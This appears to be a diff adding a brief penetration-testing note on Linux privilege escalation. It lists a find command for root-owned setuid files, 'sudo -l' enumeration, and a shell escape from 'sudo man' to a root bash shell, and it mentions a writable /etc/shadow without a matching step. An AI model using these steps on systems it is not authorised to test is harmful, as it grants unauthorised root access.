@@ -1,0 +1,29 @@
+#### Privilege Escalation : Linux
+
+Searches for files and directories owned by the `root` user that have the setuid bit set (-perm -4000), and then executes the `ls -ldb` command on each file or directory found, displaying detailed information about each one.
+
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+Example : the /etc/shadow file is writable
+
+###### List the available sudo privileges for the current user.
+
+```
+sudo -l
+```
+
+Example : the current user can run sudo man without providing password
+
+```
+sudo man ls
+```
+
+add : !/bin/bash
+
+
+
+
+
+
